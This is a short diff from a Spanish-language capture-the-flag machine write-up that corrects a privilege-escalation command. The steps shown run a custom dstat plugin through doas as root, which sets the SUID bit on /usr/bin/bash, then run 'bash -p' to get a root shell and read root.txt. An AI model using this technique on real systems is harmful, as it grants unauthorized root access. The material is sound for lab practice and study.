@@ -274,7 +274,7 @@ os.system(chmod u+s /usr/bin/bash')
 Una vez creado este archivo, le damos permisos de ejecución y lo ejecutamos con dstat
 
 ```dstat
-doas -u root /usr/bin/dstat --eskere.py
+doas -u root /usr/bin/dstat --eskere
 ```
 
 Ejecutamos ```bash -p``` y obtendríamos root, buscamos el directorio /root y allí encontraremos root.txt y habríamos terminado la máquina
